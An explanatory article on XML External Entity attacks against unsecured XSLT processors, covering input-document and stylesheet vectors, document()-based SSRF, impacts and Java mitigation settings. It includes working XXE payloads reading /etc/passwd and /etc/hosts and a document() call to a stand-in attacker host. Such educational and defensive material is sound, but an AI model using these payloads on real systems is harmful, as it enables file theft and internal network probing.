XXE in Unsecured XSLT Processors

XML External Entity (XXE) vulnerabilities in XSLT processors occur because XSLT stylesheets are themselves XML documents and rely on underlying XML parsers to process data. When an application accepts user-supplied XML or XSLT files without disabling Document Type Definitions (DTDs) and external entity resolution, attackers can force the server to disclose local files, interact with internal networks, or trigger denial-of-service conditions. This article explains how these vulnerabilities manifest during transformation, the mechanisms attackers exploit, and how to properly secure XSLT implementations.

The Underlying Mechanism

XSLT (Extensible Stylesheet Language Transformations) is designed to transform XML documents into other formats, such as HTML, plain text, or alternative XML structures. An XSLT processor requires two inputs: an XML document containing the raw data and an XSLT stylesheet containing the transformation logic.

Because both the source data and the stylesheet are XML documents, the processor uses an XML parser to read them. If the underlying parser is left in its default configuration, it typically resolves external entities defined in a DOCTYPE declaration, creating the entry point for XXE attacks.

Manifestation Vectors

XXE in XSLT processing typically manifests through two primary vectors:

1. The Input XML Document

This is the standard XXE vector. The attacker submits a malicious XML document containing an external entity to be processed by a legitimate, trusted XSLT stylesheet.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<catalog>
  <item>&xxe;</item>
</catalog>

If the stylesheet processes the <item> node with <xsl:value-of select="item"/>, the processor dereferences &xxe;, reads the contents of /etc/passwd, and renders the sensitive data directly into the transformed output.

2. The Malicious Stylesheet

If an application allows users to upload, edit, or supply their own XSLT stylesheets, an attacker can define the external entity directly inside the stylesheet's DOCTYPE.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY payload SYSTEM "file:///etc/hosts">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&payload;</output>
  </xsl:template>
</xsl:stylesheet>

When the processor parses the stylesheet, it resolves &payload;, embedding the target file's content into the resulting output regardless of what data exists in the source XML.

The Amplification: The document() Function

XSLT includes a native function called document() that allows stylesheets to fetch and parse external XML documents on the fly. In an unsecured environment, this feature amplifies XXE risks:

  • Blind XXE and File Retrieval: Attackers can use <xsl:copy-of select="document('http://attacker.com/evil.xml')"/> to load external resources.
  • Internal Network Scanning (SSRF): By providing internal network addresses (such as http://192.168.1.1:8080), attackers can map internal services, detect open ports, or interact with unauthenticated cloud metadata endpoints.

Impact of Unsecured Processing

  • Arbitrary File Disclosure: Attackers can read sensitive files, configuration files, and credentials from the server hosting the transformation engine.
  • Server-Side Request Forgery (SSRF): The processor can be coerced into initiating HTTP, FTP, or other protocol requests across the local network or internet.
  • Denial of Service (DoS): Entity expansion attacks (such as the "Billion Laughs" attack) can exhaust CPU and memory resources, crashing the host server.

Mitigation Strategies

Securing an XSLT processor requires disabling external entity resolution on both the input XML parser and the transformer itself.

  1. Disable DTDs Entirely: Configure the XML parser used by the transformer to reject DOCTYPE declarations completely. For example, in Java (DOM/SAX/JAXP), set http://apache.org/xml/features/disallow-doctype-decl to true.
  2. Disable External Entities: If DTDs cannot be disabled entirely, explicitly disable external general entities (http://xml.org/sax/features/external-general-entities) and external parameter entities (http://xml.org/sax/features/external-parameter-entities).
  3. Restrict Secure Processing (FSP): Enable XMLConstants.FEATURE_SECURE_PROCESSING on TransformerFactory implementations, which enforces limits on entity expansion and restricts external resource access.
  4. Disable External Resolvers: Set the URIResolver of the TransformerFactory to null or implement a custom resolver that denies access to external protocols like file://, http://, and gopher:// to neutralize malicious use of the document() function.
